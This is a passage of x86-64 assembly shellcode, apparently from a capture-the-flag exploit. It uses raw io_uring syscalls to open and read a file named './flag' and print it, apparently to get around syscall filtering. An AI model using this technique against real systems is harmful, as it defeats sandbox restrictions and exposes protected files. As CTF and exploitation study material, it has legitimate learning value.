    mov rax, {l.address+0x21a000}  
    mov [rip+sq_off_user_addr], rax
    lea r13, [rax + 0x1000]
    mov [rip+cq_off_user_addr], r13

    mov rax, 0x1a9
    mov rdi, 2
    lea rsi, [rip+io_uring_params]
    syscall
    mov r12, rax

    mov rax, 0x1ab
    mov rdi, r12
    mov rsi, 0x80000002
    lea rdx, [rip+fd_arr]
    mov r10, 1
    syscall

    mov rbx, [rip+sq_off_user_addr]
    mov byte ptr [rbx], 18
    mov dword ptr [rbx + 4], -100
    lea rax, [rip+path_flag]
    mov [rbx + 16], rax
    mov dword ptr [rbx + 28], 0x800
    mov dword ptr [rbx + 44], 1

    lea rbx, [64 + rbx]
    mov byte ptr [rbx], 22
    mov byte ptr [rbx + 1], 1
    mov dword ptr [rbx + 4], 0
    lea rax, [buf]
    mov [rbx + 16], rax
    mov dword ptr [rbx + 24], 128

    mov eax, [rip+sq_off_array]
    mov rbx, r13
    add rbx, rax
    mov dword ptr [rbx], 0
    mov dword ptr [rbx + 4], 1

    mov eax, [rip+sq_off_tail]
    mov rbx, r13
    add rbx, rax
    mov dword ptr [rbx], 1

    mov rax, 0x1aa
    mov rdi, r12
    mov rsi, 1
    mov rdx, 1
    mov r10, 0x11
    syscall

    mov dword ptr [rbx], 0

    mov rax, 0x1aa
    mov rdi, r12
    mov rsi, 1
    mov rdx, 1
    mov r10, 0x11
    syscall

    mov eax, [rip+sq_off_array]
    mov rbx, r13
    add rbx, rax
    mov dword ptr [rbx], 0
    mov dword ptr [rbx + 4], 1

    mov eax, [rip+sq_off_tail]
    mov rbx, r13
    add rbx, rax
    mov dword ptr [rbx], 1

    mov rax, 0x1aa
    mov rdi, r12
    mov rsi, 1
    mov rdx, 1
    mov r10, 0x11
    syscall

    mov dword ptr [rbx], 0

    mov rax, 0x1aa
    mov rdi, r12
    mov rsi, 1
    mov rdx, 1
    mov r10, 0x11
    syscall

    mov rax, 1
    mov rdi, 1
    lea rsi, [rip+buf]
    mov rdx, 128
    syscall

area_ptr:
  .quad 0

io_uring_params:
  .long 0 # sq_entries
  .long 0 # cq_entries
  .long 0xc000 # flags = IORING_SETUP_REGISTERED_FD_ONLY | IORING_SETUP_NO_MMAP
  .long 0 # sq_thread_cpu
  .long 0 # sq_thread_idle
  .long 0 # features
  .long 0 # wq_fd
  .long 0 # resv[0]
  .long 0 # resv[1]
  .long 0 # resv[2]
  .long 0 # sq_off.head
sq_off_tail:
  .long 0 # sq_off.tail
  .long 0 # sq_off.ring_mask
  .long 0 # sq_off.ring_entries
  .long 0 # sq_off.flags
  .long 0 # sq_off.dropped
sq_off_array:
  .long 0 # sq_off.array
  .long 0 # sq_off.resv1
sq_off_user_addr:
  .quad 0 # sq_off.user_addr
  .long 0 # cq_off.head
  .long 0 # cq_off.tail
  .long 0 # cq_off.ring_mask
  .long 0 # cq_off.ring_entries
  .long 0 # cq_off.overflow
  .long 0 # cq_off.cqes
  .long 0 # cq_off.flags
  .long 0 # cq_off.resv1
cq_off_user_addr:
  .quad 0 # cq_off.user_addr

fd_arr:
  .long -1

path_flag:
  .asciz "./flag"

buf:
  .rept 128